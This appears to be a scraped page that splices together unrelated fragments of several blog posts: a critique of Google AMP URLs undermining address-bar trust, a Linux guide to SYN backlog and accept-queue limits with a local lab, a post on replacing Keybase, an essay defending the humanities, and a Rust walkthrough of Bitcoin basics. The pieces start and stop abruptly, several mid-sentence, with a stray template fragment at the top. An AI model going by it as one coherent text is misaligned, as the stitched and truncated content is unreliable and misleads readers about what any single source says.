ultra simple! Here's the template for copy-pasting:</p><h3 id="now">Now</h3><ul><li>item</li><li>item</li><li>item</li></ul><h3 id="soon">Soon</h3><ul><li>item</li><li>item</li><li>item</li></ul><h3 id="later">Later</h3><ul><li>item</li><li>item</li><li>item</li></ul>

    <section>
        <p>Take a look at the below screenshot from Safari for iOS. What website am I on?</p>

<p><img src="https://theinternetbytes.com/images/amp-nytimes-example.png" alt="AMP Example with NYTimes"></p>

<p>Based on the contents of the page, I’m clearly on a NYTimes property, but based
on the address bar I’m clearly on <code>google.com</code>. If I click in the address bar
I see <code>https://www.google.com/amp/s/www.nytimes.com/2020/05/22/technology/google-antitrust.amp.html</code>. Confused, I consult <a href="https://www.google.com/safebrowsing/static/faq.html">Google’s Safebrowsing FAQ</a>:</p>

<blockquote>
<p><strong>How can I tell if a page is a fake?</strong></p>

<p>The best thing to do is to check the page’s URL to make sure it’s actually controlled by the party it appears to be controlled by. The crucial part of the URL is the part between the http:// and the next slash (‘/’). (If there’s no slash, start at the end of the URL.) This is the part of the URL that determines site ownership. Some popular domains, for instance, are amazon, google, and ebay:</p>

<p><code>http://www.amazon.com</code><br>
<code>http://www.google.com</code><br>
<code>http://www.ebay.com</code></p>

<p>In some cases, URLs will be a bit more complex; be sure to check the name listed immediately to the left of the top level domain (.com, .net, .co.uk, etc.).
For instance, <code>http://www.google.com</code>, <code>http://news.google.com</code> and <code>http://www.google.com/firefox/</code> are all part of the same site. However, <code>google.com.fraudulentdomain.com/login.html</code> is NOT! Neither is <code>www.g00gle.com</code> (note that in this URL, the letter o is replaced by the number 0).</p>
</blockquote>

<p>and determine I’m on <code>www.google.com</code>—but the confusion remains since
this is genuinely NYTimes content and branding.</p>

<p>This is a really dangerous pattern: Google serves NYTimes’ controlled<sup id="fnref:1"><a href="#fn:1">1</a></sup>
content on a Google domain (<code>www.google.com</code>) and wants the user to trust that it is NYTimes’ content. <strong>It confuses the user whether to trust the address in
URL bar or the content of the page</strong> Meanwhile Google, Internet safety groups, and workplaces actively try to
teach users to check domains and URL address bars. The confusion over trusting page content or address bar contents is precisely why phishing
attempts work so well. Humans trust visual indicators a lot. Google, with the AMP
Cache Project, is confusing humans more and training them to trust visual content
of the page over the URL in the address bar (in certain contexts)—despite telling them to do otherwise on different sites.
This surprises me since Google
spends a lot of time researching visual indicators of security in the address bar
(like the padlock icon)<sup id="fnref:2"><a href="#fn:2">2</a></sup>. In work security trainings and guides on the Internet,
we are trained to look at the address bar to help make a decision on whether to trust
a site, but the Google AMP Cache requires contradictory rules from what we’d use elsewhere.</p>

<p>The speed of AMP is a nice benefit<sup id="fnref:3"><a href="#fn:3">3</a></sup>, but there are still some UX challenges to handle in order
to reinforce—not muddy—the security lessons we teach Internet users.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>When writing services that accept TCP connections, we tend to think of our work as starting from the point where our service accepts a new client connection and finishing when we complete the request and close the socket. For services at scale, operations can happen at such a high rate that some of the default resource limits of the Linux kernel can break this abstraction and start causing impact to incoming connections outside of that connection lifecycle. This post focuses on some standard resource limitations that exist before the client socket is handed to the application - all of which came up during the course of investigating errors on production systems as part of my role at GitHub (in some cases, multiple times across different applications).</p>

<p>In its most basic form (ignoring non-blocking variants), listening for TCP connections requires a call to <code>listen()</code> to actually start allowing incoming connections, followed by repeated calls to <code>accept()</code> to take the next pending connection and return a file descriptor that is for that particular client. In C this pattern looks something like:</p>
<div><div><pre><code><span>int</span> <span>server_fd</span> <span>=</span> <span>socket</span><span>(</span><span>AF_INET</span><span>,</span> <span>SOCK_STREAM</span><span>,</span> <span>0</span><span>);</span>
<span>bind</span><span>(</span><span>server_fd</span><span>,</span> <span>/* ... */</span><span>);</span>

<span>// start listening for connections</span>
<span>listen</span><span>(</span><span>server_fd</span><span>,</span> <span>512</span><span>);</span>

<span>while</span> <span>(</span><span>running</span><span>)</span> <span>{</span>
    <span>// block until a connection arrives and then accept it</span>
    <span>int</span> <span>client_fd</span> <span>=</span> <span>accept</span><span>(</span><span>server_fd</span><span>,</span> <span>NULL</span><span>,</span> <span>NULL</span><span>);</span>

    <span>// ... handle client_fd ...</span>
<span>}</span>

<span>close</span><span>(</span><span>server_fd</span><span>);</span>
</code></pre></div></div>

<p>This is often hidden behind further layers of abstraction, and we tend to hide away all the implementation details of accepting connections and view it as a stream of new connections that we pick up and then process in parallel. However, when building a system that runs at a certain scale, this abstraction tends to break down because there are resource limitations introduced in the period where connections are being established but are not yet returned by <code>accept()</code>. Before that point, those client connections are considered as being part of the server/listen socket and not as independent resources exposed to the application.</p>

<p>The examples mentioned in this blog post will be reproducible in the lab from <i></i> <a href="https://github.com/theojulienne/blog-lab-scaling-accept">theojulienne/blog-lab-scaling-accept</a> - clone this repository bring up the lab, then poke around at these examples in a real system:</p>
<div><div><pre><code>$ git clone https://github.com/theojulienne/blog-lab-scaling-accept.git
$ cd blog-lab-scaling-accept
$ vagrant up
$ vagrant ssh
</code></pre></div></div>

<h2 id="from-syn-to-accept">From SYN to accept()</h2>

<p>The Linux kernel maintains 2 queues of connections that maintain the backlog of connections that are not yet <code>accept()</code>ed by the application:</p>
<p><img alt="LISTEN backlogs" src="https://theojulienne.io/images/scaling-linux-services-before-accepting-connections/pre-accept-backlogs.png">
</p>

<p>When a SYN packet is received to initiate a new connection to a listen socket, a SYN-ACK is sent to the client and the half-completed connection state is stored in the “SYN backlog” or “Request Socket Queue”. This represents connections that have not yet been fully validated as having two-way communication between the hosts, because we haven’t yet validated that the remote end has received a packet from us (the SYN could have come from another host spoofing the source IP).</p>

<p>Once the client responds to the server’s SYN-ACK with an ACK, the connection has then completed the full <a href="https://en.wikipedia.org/wiki/Handshaking#TCP_three-way_handshake">TCP 3-way handshake</a>, and the server knows that two-way communication has been established. At this point, the client connection is ready to be provided to the application at a future call to <code>accept()</code>, and is added to the appropriately named “accept queue”.</p>

<h2 id="syn-backlog">SYN backlog</h2>

<p>Connections in the SYN backlog remain there for a period of time relative to the Round Trip Time between the server and the client. If there are N slots in the backlog then you can have at most N connections in this backlog per average RTT, after which the backlog overflows.</p>

<p>This won’t actually cause the connections to fail by default on Linux, but cause <a href="https://en.wikipedia.org/wiki/SYN_cookies">SYN cookies</a> to be sent instead. This is because when only a SYN packet has been received, the server hasn’t yet validated that the client is who they say they are, so they could be spoofing packets as coming from a different IP. This is a common Denial of Service attack called a <a href="https://en.wikipedia.org/wiki/SYN_flood">SYN Flood</a>. Because this is so common, the Linux kernel has built in mitigation to SYN floods by sending a SYN cookie when there is no room in the SYN backlog for the new connection.</p>

<p>This means that even if the SYN backlog overflows under normal circumstances with no DoS attack, the kernel allows the connection to move further along in the handshake, and won’t store any resources for the connection until an ACK completes the handshake. Sending SYN cookies during normal circumstances does however indicate that the rate of connections is probably too high for the default limits - SYN cookies are really only meant for mitigating SYN floods.</p>

<p>Whether SYN cookies are enabled is controlled via the sysctl <code>net.ipv4.tcp_syncookies</code>, by default this is set to <code>1</code> which indicates that SYN cookies should be sent when the SYN backlog overflows, but can also be set to <code>0</code> to disable entirely or <code>2</code> to force SYN cookies to be sent 100% of the time.</p>

<p>When SYN cookies are enabled as needed (the default), they are triggered when the number of pending connections in the SYN backlog is more than the configured accept queue backlog size for the socket - the logic for this is <a href="https://github.com/torvalds/linux/blob/cb8e59cc87201af93dfbb6c3dccc8fcad72a09c2/net/ipv4/tcp_input.c#L6612-L6613">here</a>. When SYN cookies are fully disabled, <code>net.ipv4.tcp_max_syn_backlog</code> configures the number of connections allowed in the SYN backlog separately - the logic for this case is <a href="https://github.com/torvalds/linux/blob/cb8e59cc87201af93dfbb6c3dccc8fcad72a09c2/net/ipv4/tcp_input.c#L6670-L6672">here</a>.</p>

<p>In the default configuration where the backlog overflows and SYN cookies are sent, the kernel increments the <code>TCPReqQFullDoCookies</code> counter and logs this line to the kernel log, which is often confused for an indicator of a real SYN flood even when it’s just due to legitimate connections coming in too fast:</p>
<div><div><pre><code>TCP: request_sock_TCP: Possible SYN flooding on port 8080. Sending cookies.  Check SNMP counters.
</code></pre></div></div>

<p>If SYN cookies are explicitly disabled, the kernel increments the <code>TCPReqQFullDrop</code> counter and the following would be logged instead:</p>
<div><div><pre><code>TCP: request_sock_TCP: Possible SYN flooding on port 8080. Dropping request.  Check SNMP counters.
</code></pre></div></div>

<p>If you see this message for internal service-to-service connections, chances are you’re dealing with a scaling problem or a <a href="https://en.wikipedia.org/wiki/Thundering_herd_problem">thundering herd problem</a>, and not an actual SYN flood or intentional bad actor.</p>

<p>Those “SNMP Counters” that the kernel mentions are available in <code>nstat</code> in the network namespace:</p>
<div><div><pre><code>$ nstat -a | grep TCPReqQFull
TcpExtTCPReqQFullDoCookies      706                0.0
</code></pre></div></div>

<h3 id="syn-backlog-in-the-lab">SYN backlog in the lab</h3>

<p>To see how the SYN backlog behaves in the lab, we can simulate latency on local connections with the following:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo /vagrant/reset-lab.sh
vagrant@blog-lab-scaling-accept:~$ sudo tc qdisc add dev lo root netem delay 200ms
vagrant@blog-lab-scaling-accept:~$ ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=401 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=400 ms
</code></pre></div></div>

<p>This means we can now simulate overflowing the SYN backlog. To make it a bit easier to reproduce, reduce the size of the SYN backlog from the default of <code>128</code> by reducing <code>net.core.somaxconn</code> (because SYN cookies are enabled):</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo sysctl net.core.somaxconn
net.core.somaxconn = 128
vagrant@blog-lab-scaling-accept:~$ sudo sysctl -w net.core.somaxconn=10
net.core.somaxconn = 10
vagrant@blog-lab-scaling-accept:~$ sudo systemctl restart nginx
vagrant@blog-lab-scaling-accept:~$ 
</code></pre></div></div>

<p>At this point, if more than 10 connections arrive within 400ms (before the SYN-ACK and ACK handshake complete), then 10 connections will be in the SYN backlog, which is the maximum configured. This will trigger SYN cookies to be sent, triggering the message and counters above. Let’s test out if this works, run a simulation that opens N concurrent connections:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ python /vagrant/test_send_concurrent_connections.py 127.0.0.1:80 20
Waiting, Ctrl+C to exit.
</code></pre></div></div>

<p>And verify that SYN cookies were sent as expected:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo dmesg -c
[ 2571.784749] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.  Check SNMP counters.
vagrant@blog-lab-scaling-accept:~$ sudo nstat | grep ReqQ
TcpExtTCPReqQFullDoCookies      10                 0.0
vagrant@blog-lab-scaling-accept:~$
</code></pre></div></div>

<p>Try disabling the simulated latency with <code>sudo tc qdisc del dev lo root</code> and re-run the same test, now connections move through fast enough that SYN cookies are not sent.</p>

<p>This also demonstrates the way the Round Trip Time effects the amount of connections that can burst into a LISTEN socket - <code>test_send_concurrent_connections.py</code> does actually attempt to initiate complete connections and <code>nginx</code> on the other end is readily calling <code>accept()</code> as fast as it can, but because 20 connections are initiated at once, 20 SYN packets arrive before any handshake can continue, and the SYN backlog overflows. You can imagine that in the real world, with some of these values often defaulting to <code>128</code>, and users often being far away from servers (on the other side of the world), it’s pretty easy to accidentally trigger this scenario without a true SYN flood.</p>

<h2 id="accept-queue">Accept queue</h2>

<p>Once an ACK packet is received and validated, a new client connection is ready for the application to process. This connection is moved into the accept queue, waiting for the application to call <code>accept()</code> and receive it.</p>

<p>Unlike the SYN backlog, the accept queue has no backup plan for when it overflows. Back in the original call to <code>listen()</code>, a <code>backlog</code> argument was provided, which indicates how many connections can have completed the 3-way handshake and be waiting in the kernel for the application to accept.</p>

<p>This is the first common issue: If the <code>backlog</code> number provided to <code>listen()</code> is not large enough to contain any number of connections that could reasonably complete their handshake between 2 calls to <code>accept()</code>, then a connection will be dropped on the floor, and the application generally won’t even notice - the next call to …</p></article></div>

It's main features are as follows (ordered as on the website):</p> <ul> <li>E2EE chats and messaging (people and teams).</li> <li>Cryptographic identity verification from around the net.</li> <li><a href="https://book.keybase.io/docs/files" rel="noopener noreferrer" target="_blank">KBFS</a> (Public signed file hosting, private E2EE file storage w/ sharing, <a href="https://book.keybase.io/docs/files#keybase-pub" rel="noopener noreferrer" target="_blank">Static site hosting??</a>)</li> <li>Git repositories? Crypto? <a href="https://saltpack.org/" rel="noopener noreferrer" target="_blank">An alternative to PGP?</a></li> </ul> <h2 id="-previous-attempts-to-replace-keybase">## Previous Attempts to Replace Keybase</h2> <p>I'm not the first person to try this, obviously. Some brave folks have tried to build Keybase alternatives, such as <a href="https://keys.pub/" rel="noopener noreferrer" target="_blank">keys.pub</a> and the brand-new <a href="https://keyoxide.org/" rel="noopener noreferrer" target="_blank">Keyoxide</a>. I've tried both, but found that though they both are good in their own right, they are not the solutions that I am looking for.</p> <h2 id="-ok-time-for-the-steps">## OK Time for the Steps</h2> <h3 id="-step-1-chatmessaging">### Step #1: Chat/Messaging</h3> <p>There are a few great pre-existing options for encrypted messaging: <a href="https://signal.org/" rel="noopener noreferrer" target="_blank">Signal</a>, <a href="https://beta.protonmail.com/" rel="noopener noreferrer" target="_blank">ProtonMail</a> if you want to go full email, <a href="https://telegram.org/" rel="noopener noreferrer" target="_blank">Telegram</a>, and <a href="https://www.whatsapp.com/" rel="noopener noreferrer" target="_blank">WhatsApp</a>. However, they all have their problems (though I use the first two on a daily basis). Signal requires a phone number, and is more of an iMessage/text replacement than a Slack-style chat app. Protonmail is literally not chat – it's email. Telegram is <a href="https://news.ycombinator.com/item?id=6936539" rel="noopener noreferrer" target="_blank">not</a> <a href="https://translate.google.com/translate?hl=en&amp;sl=ru&amp;u=http://habrahabr.ru/post/206900/" rel="noopener noreferrer" target="_blank">secure</a>. If you use WhatsApp for security you might be crazy –&nbsp;I only use it because it's <em>the way</em> to communicate with people in the Middle East and Africa.</p> <p>Instead, I would recommend you use <a href="https://matrix.org/" rel="noopener noreferrer" target="_blank"><strong>Matrix</strong></a>. Matrix is an "open network for secure, decentralized communication," and it's the perfect replacement for Keybase's chat <del>and I would argue most other chat apps too</del>. It utilizes E2E encrypted messaging, and can be self-hosted as well <del>or if you're cheap like me just get your friend to host</del>.</p> <p>In addition to a Matrix server, you also need a client. For this, I recommend <a href="https://about.riot.im/" rel="noopener noreferrer" target="_blank"><strong>Riot</strong></a>. Riot is a beautiful Matrix client with a bunch of awesome features, including Slack-like integrations, and apps for pretty much every major platform (Linux, MacOS, Windows, iOS, Android, and a web client). <del>Plus it looks a lot like Discord.</del></p> <h3 id="-step-2-identity-verification">### Step #2: Identity verification</h3> <p>Replacing Keybase's <a href="https://web.archive.org/web/20140322062148/https://keybase.io/" rel="noopener noreferrer" target="_blank">original function</a> is probably the most difficult part of this tutorial: cryptographically verified identity proofs is a great and innovative idea. I would swap this out with an <a href="https://indieweb.org/" rel="noopener noreferrer" target="_blank"><strong>IndieWeb</strong></a> profile –&nbsp;one <a href="http://microformats.org/wiki/h-card" rel="noopener noreferrer" target="_blank">part</a> of the larger <a href="http://microformats.org/" rel="noopener noreferrer" target="_blank">microformats</a> HTML structure. There are some pretty great tutorials out there (I would recommend <a href="https://kevq.uk/how-to-create-an-indieweb-profile/" rel="noopener noreferrer" target="_blank">this one</a> by the fantastic <a href="https://kevq.uk/" rel="noopener noreferrer" target="_blank">Kev Quirk</a> and <a href="https://randomgeekery.org/post/2020/04/indieweb-h-cards/" rel="noopener noreferrer" target="_blank">this one</a> by <a href="https://randomgeekery.org/" rel="noopener noreferrer" target="_blank">Brian Wisti</a>), so I won't go into too much detail about exactly how to do that. However, it's important to note that though Kev recommends hiding your h-card with the <code>display: none;</code> property: <a href="https://indieweb.org/antipatterns#invisible_metadata" rel="noopener noreferrer" target="_blank">don't do that</a>. I just merged my about and contact pages onto my homepage, and added the microformats classes to my existing markup.</p> <p><img alt="My IndieWeb h-card" src="https://figbert.com/content/posts/how-to-replace-keybase-in-three-easy-steps/h-card.png"></p> <h3 id="-step-3-file-storage">### Step #3: File Storage</h3> <p>Replacing KBFS is easy to do, but hard to get right. Swapping to <a href="https://www.google.com/drive/" rel="noopener noreferrer" target="_blank">Google Drive</a> is probably the move that most people would make, but that abandons the entire security/encryption aspect of Keybase. There's also <a href="https://www.dropbox.com/" rel="noopener noreferrer" target="_blank">Dropbox</a>, but that has the same problems as above. <a href="https://twitter.com/ProtonMail/status/1278389663078768641" rel="noopener noreferrer" target="_blank">ProtonDrive</a> has potential, but it's not out yet. Enter <a href="https://syncthing.net/" rel="noopener noreferrer" target="_blank"><strong>Syncthing</strong></a>. <a href="https://tonsky.me/blog/syncthing/" rel="noopener noreferrer" target="_blank">Nikita Tonsky</a> wrote one of my favorite posts of all time about Syncthing – go read it. One reason Syncthing is so great is that it's not the same thing as KBFS or any of the other "Drive" solutions. Instead of being a file hosting system, it's a "continuous file synchronization program." You have no data limits other than your storage and no third-party to worry about. Plus, sharing folders is also incredibly easy. Just read the article.</p> <h3 id="-bonus-step-4-video-calling">### Bonus Step #4: Video Calling</h3> <p>It would be a shame to talk about text chat, or really any form of communication, in this new pandemic age without talking about video chat. After all, the whole reason I'm writing this article is because the new videocalling giant <a href="https://zoom.us/" rel="noopener noreferrer" target="_blank">Zoom</a>. So, how have I replaced Zoom and how does that relate to replacing Keybase? Well, Matrix happens to have a fantastic <a href="https://jitsi.org/" rel="noopener noreferrer" target="_blank">Jitsi Meet</a> <a href="https://matrix.org/blog/2020/04/06/running-your-own-secure-communication-service-with-matrix-and-jitsi" rel="noopener noreferrer" target="_blank">integration</a>. Plus, the folks over at Jitsi are <a href="https://jitsi.org/blog/e2ee/" rel="noopener noreferrer" target="_blank">working on E2E encryption for their calls</a>. I've integrated Jitsi Meet into my self-hosted instance of Matrix, and now all my videocalls are just that – mine!</p> <h2 id="-summary">## Summary</h2> <ul> <li>Swapped chat to Matrix and Riot.</li> <li>Swapped identity verification to Indieweb.</li> <li>Swapped file storage/sync to Syncthing.</li> <li>Added videocalling to chat program via Jitsi.</li> </ul> <h2 id="-conclusion">## Conclusion</h2> <p>Keybase is a great service, and the people who work there should be really proud of what they've built. However, given Zoom's aquisition of the company, the stability and security of the product have been called into question. So, ever one to hop on a hype train, I jumped ship. I'm really happy with my solution, and I'd love to hear your thoughts as well <del>as soon as I set up webcomments</del>.</p> </section></article></div>]]>

<p>I have been holding off writing something like this, because it is often such a well-worn topic and I hardly wanted to preach to the converted.  But at the same time, the humanities need all of the defenses they can get and I’ve found, looking at the genre, that my answers for why we need the humanities are rather different from the typical answer.</p>



<p>But first, the <strong>shameless plug</strong> that if <strong>you</strong>, yes <strong>you!</strong> want to support the humanities, you can support <em>this</em> humanist by sharing my writing, subscribing with the button below or by supporting me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>.  Your support enables me to continue telling you and other people to continue supporting me, a giant self-devouring<a href="https://en.wikipedia.org/wiki/Ouroboros"> ouroboros </a>of support that will grow to become so large it will crush the world (I look forward to regretting this joke in the future).</p>






<p>Edit: A friendly reminder to those in the comments: you will be <em>civil</em>.  This thread has prompted some spirited discussion.  That’s fine.  But it will remain polite.</p>



<h2>What Humanities?</h2>



<p>First, just to define my terms, <strong>what are the humanities</strong>?  Broadly, they are the disciplines that study human society (that is, that are concerned with humanity): language study, literature, philosophy, history, art history, archaeology, anthropology, and so on.  It is necessarily a bit of a fuzzy set.  But what I think defines the humanities more than subject matter is <strong>method</strong>; the humanities study things which (we argue) <em>cannot</em> be subjected to the rigors of the scientific method or strictly mathematical approaches.  You cannot perform a controlled trial in beauty, mathematical certainty in history is almost always impossible, and there is no way to know much stress a society can bear except to see it fail.  Some things cannot be reduced to numbers, at least not by the powers of the technology-aided human mind.</p>



<p>By way of example, that methodological difference is why there’s a division between <strong>political science</strong> and <strong>history</strong>, despite the two disciplines historically being concerned with many of the same subjects and the same questions (to the point that Thucydides is sometimes produced as the founder of both):<strong> they use different methods</strong>.  History is a humanities discipline through and through, whereas political science attempts to hybridize humanities and STEM (Science, Technology, Engineering and Mathematics) approaches; that’s not to say historians never use statistical approaches (I do, actually, quite a lot) but that there are very real differences in methodology.  As you might imagine, that difference leads to some <a href="https://warontherocks.com/2020/06/want-better-strategists-teach-social-science/">competition </a>and <a href="https://warontherocks.com/2020/05/finally-getting-serious-about-professional-military-education/">conflict </a>between the disciplines as to whose methodology best answers those key questions or equips students to think about them.  Given that I have a doctorate in history and self-identify as a historian, you will have no trouble guessing which side of this I come down on, although that might be a bit self-interested on my part.</p>

I was struck reading this (and the Genji Monogatari; the two works were paired in the course) by how radically different the culture was from any of the ones I knew.  It was one of the first moments I ‘got’ the ‘past is a foreign country’ thing.  At the same time, when I later dug deeper into Roman martial culture, the commonalities between Roman elite military virtue and the values of the Tale of the Heike were striking.  The human part of ‘the human experience’ is common, even if the experience part is not.<br>Since this isn’t a topic where visual illustration is strictly on-point, I am going to use the images here to share some of the works outside of Greek and Roman history, which I encountered in my education in the humanities which influenced me and my thinking.</figcaption></figure>



<p>So if the STEM fields are, at some level, fundamentally about numbers, the humanities are <strong>fundamentally about language</strong>.  The universe may be made of numbers, but the human mind and human societies are constructed out of language.  Unlike computers, we do not think in numbers, but in words and consequently, the study of humans as <em>thinking</em> creatures is mostly about those words (yes, yes, I see you there, economics and psychology; there are edge cases, of course).  Our laws are written in words because our thoughts form <em>in our heads</em> as words; we naturally reason with words and we even <em>feel</em> with words.  Humans are linguistic creations in a mathematical universe; consequently, while the study of the universe is mediated through math, the study of humans and human minds is fundamentally linguistic in nature.</p>



<p>Thus, the humanities.</p>



<h2>Oh, the Humanities!</h2>



<p>Now I want to note here the standard defense of the humanities, which is that the study of human culture, literature and art enriches the soul and the experience of life.  <strong>This is, to be clear, undoubtedly true</strong>.  There is joy and richness in the incredible kaleidoscope of human expression and a deep wisdom in the realization of both how that expression joins us, and how radically different it can be.  There is also the enjoyment of developing a ‘palette’ for art and literature which is enhanced by knowing <em>more</em> of it, in being able to see the innovations and cross-connections (the ‘intertext’ to use the unnecessarily fancy academic term).  This is all very much the case.  There is a reason that rich people with abundant free time have consistently gravitated to the study of the humanities, or supported it.</p>



<p><strong>But this is a weak defense of the humanities as they are currently constructed</strong>.  The fact is that the academic humanities exist because people who <em>do not study the humanities</em> fund them.  The modern study of the humanities, in its infancy, was paid for by wealthy elites who wanted either that joyful richness or at least the status that came from funding it.  I should note here also that the humanities were never for the <em>teachers</em> of the humanities, but for its students.  The rich funders of the humanities were rarely the authors of the great treatises or studies; rather they wished to be the <em>readers of them</em> (and likewise, the modern academic humanities are not <em>for</em> professors, but the students we teach; more on this next time).  Down until really quite recently, education in the humanities was largely reserved for that elite and their academic clients.  As public support for the humanities continues to decline, many humanities fields seem in real danger of reverting back to that status: a prestigious toy for the already-rich and already-elite.</p>

In high school, I had largely been taught Greek mythology as a stand-alone idea, something the Greeks came up with all on their own – indeed, I was taught all of ancient Greek culture that was, as if it just sprang out of the ground.  Reading Kingship in Heaven – the myth of Teshub’s origin – was revelatory, because here was a forerunner to Hesiod’s Theogony, the foundation-stone for teaching Greek mythology.  <a href="https://www.amazon.com/East-Face-Helicon-Clarendon-Paperbacks/dp/0198152213">Hesiod had been borrowing</a>, he had been influenced and Greek mythology no longer stood on its own but slowly wrapped itself into an older, richer edifice of literature stretching back to the haziest beginnings of our knowledge.</figcaption></figure>



<p>Avoiding that retreat of the humanities back into the wealthy elite means defending the humanities on different grounds.  Of course, the traditional humanities will always survive at Harvard or Cambridge or Yale.  But for the humanities to actually be <em>generally</em> available, they need to survive, to thrive, outside of those spaces.  And yet, no good that is tethered to colleges can be justified solely through the benefit it gives the holder.  <strong>Colleges, after all, are publicly funded, but while everyone pays taxes, not everyone goes to college</strong>.  The OECD average rate for tertiary-education-completion among adults<a href="https://en.wikipedia.org/wiki/List_of_countries_by_tertiary_education_attainment"> is around 37% </a>and not all of those are four-year university degrees.  To break down the United States’ data, while 44% of Americans have completed some kind of tertiary education, putting the USA towards the top of the scale (and around two-thirds have at least <em>some</em> college, though they may not have completed it), <a href="https://en.wikipedia.org/wiki/Educational_attainment_in_the_United_States">only 35% of Americans have a four-year degree</a>.  And of course, only a subset of those degree-holders will have taken very much in the way of the humanities.  Which means <strong>the taxes that pay to fund the public universities that make up the great bulk of the study of the humanities are going to mostly come from people who have not, or could not, avail themselves of a humanistic education</strong>.</p>



<p>Even if we made the humanities available to all – a goal I robustly support (it is one reason I am spending all this time working on this open, free web platform, after all) – that effort would likely have to be publicly funded through a great many tax-payers who did not care to consume much of the <em>academic</em> products of the humanities (even if they consume many of its pop-cultural byproducts without knowing it).  <strong>We must be able to justify the expense to them</strong>.  And alas, while I love crowd-funding (did I mention, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>?), it is simply not an alternative for the research and teaching environment of the university (though I think it is and ought to be an important parallel model, for reasons I’ll get into in a moment).  The fact is that while ‘short’ essays, blog posts and public-facing books can be popularly funded, <strong>the slow, painstaking work that forms the <em>foundation</em> for those efforts has no ready popular market</strong>; but without the latter, the former withers (as a note: my <em>next</em> Collections post will be on the process by which knowledge filters from the latter to the former).</p>



<p><strong>We must be prepared to explain the value of the humanities to people for …</strong></p></div></div>

                <p>03 July 2020</p>
                <p>Understanding the fundamental building blocks(😉) of Bitcoin can be daunting for some developers. I find it difficult to meaningfully understand a system without knowing how everything fits together. </p>
                <p>A good way to go through this process is to lay down, however rudimentary, a set of processes by which the system operates. Hence the purpose of this guide is to explain through simple pieces of code, how Bitcoin works.</p>
                <p>Note: The intention is not to create a real implementation of the Bitcoin protocol. It also does not aim to explain every concept. Look for the embedded links if you find a concept you need to go over. Also look out for notes where concepts have been simplified and differ from the real Bitcoin implementation.</p>
                <p>Hopefully by the end of this series, we should have a bitcoin-like protocol anyone can run.</p>
                <p>The code written until this point is available <a href="https://github.com/monokh/nibble/tree/813d3d694d1ea0b6c71ce5854a1393e9deb61904">here</a>.</p>
                <p>From a very high level. This is bitcoin:</p>
                <pre id="code-main"><code>
let keypair = crypto::KeyPair::new();
let keypair2 = crypto::KeyPair::new();

let tx1 = create_signed_tx(&amp;keypair, keypair2.public_key, 123);
let tx2 = create_signed_tx(&amp;keypair2, keypair.public_key, 75);

let txs = vec![tx1, tx2];

let proposed_block = block::ProposedBlock {
    transactions: txs,
};

println!("Mining block with {} txs.", proposed_block.transactions.len());
let block = proposed_block.mine(3); // Difficulty 3 i.e. hash must begin with "000"
println!("Mined block: {:#?}", block);
                </code></pre>
                <p>We can split what we see here into the following categories:</p>
                <ul>
                    <li>Keys</li>
                    <li>Transactions</li>
                    <li>Blocks</li>
                    <li>Mining</li>
                </ul>

                <h2>Keys</h2>
                <p>Keys are required as a means to achieve ownership. In other words, you need to have the key to spend a certain amount of bitcoin.</p>
                <pre><code>
pub struct KeyPair {
    pub public_key: key::PublicKey,
    private_key: key::SecretKey,
}
                </code></pre>
                <p>Your keys actually consist of 2 parts. The private key and the public key. The public key can be shared with the world and is used to receive bitcoin, whereas the private key is something you keep secure as it can be used to spend your bitcoin. <a href="https://nakamoto.com/public-key-cryptography/#public-keys-as-identity">More on public key cryptography.</a></p>

                <h3>Creating keys</h3>
                <p>In bitcoin, <a href="https://hackernoon.com/what-is-the-math-behind-elliptic-curve-cryptography-f61b25253da3">eliptic curves are used for public key cryptography</a> - specifically secp256k1. In essense, using a (psuedo)random number we can generate a pair of keys that can be thought of as a user's wallet. </p>
                <pre><code>
let mut rand = rand::OsRng::new().unwrap();
let secp = Secp256k1::new();
let (private_key, public_key) = secp.generate_keypair(&amp;mut rand);
KeyPair {
    secp,
    public_key,
    private_key,
}
                </code></pre>

                <h2>Transaction</h2>
                <p>Transactions are the smallest unit of the Bitcoin system. A transaction is a data structure which encodes a payment of x bitcoins from a to b.</p>
                <p>In Bitcoin, transactions are not as simple as transferring a balance (account based), but rather a collection of inputs and outputs. This is generally called the <a href="https://en.wikipedia.org/wiki/Unspent_transaction_output">"UTXO model"</a>.</p>
                <pre><code>
pub struct Transaction {
    pub from: PublicKey,
    pub to: PublicKey,
    pub amount: u32
}
                </code></pre>
                <p>The public keys here are precisely from the key pairs that were generated. </p>
                <p>What then prevents anyone from transferring on behalf of others? Public key cryptography. To be a valid transaction and be accepted into the network by others, the transaction needs to be "Signed" by the `from` private key. </p>
                <pre><code>
impl KeyPair {
    pub fn sign(&amp;self, message: &amp;[u8]) -&gt; Signature {
        ...
        self.secp.sign(&amp;message, &amp;self.private_key);
    }
}
                </code></pre>

                <h3>Signed transaction</h3>
                <p>As mentioned previously, private keys exercise control over a number of bitcoins. A's private key is used to sign a transaction so that anyone can verify that the transaction from A to B was in fact authorised by A. </p>
                <pre><code>
let tx = transaction::Transaction {
    from: keypair.public_key,
    to,
    amount,
};

let sig = keypair.sign(&amp;tx.hash());

return transaction::SignedTransaction{
    transaction: tx,
    sig: sig.to_string(),
};
                </code></pre>

                <h2>Block</h2>
                <p>A block is a collection of transactions. These transactions should be signed and therefore valid.</p>
                <pre><code>
let tx1 = create_signed_tx(&amp;keypair, keypair2.public_key, 123);
let tx2 = create_signed_tx(&amp;keypair2, keypair.public_key, 75);

let txs = vec![tx1, tx2];

let proposed_block = block::ProposedBlock {
    transactions: txs,
};
                </code></pre>
                <p>In fact, on the bitcoin network, the only data which is replicated across are the blocks. The purpose of the block is to effectively write it's containing transactions into history. It achieves this by mining.</p>

                <h2>Mining</h2>
                <p>The process of <a href="https://en.bitcoin.it/wiki/Mining">mining</a> is to do a computation to ensure that there is something at stake. In other words, the miner has to prove they have done some work - <a href="https://en.bitcoin.it/wiki/Proof_of_work">"Proof of Work"</a></p>
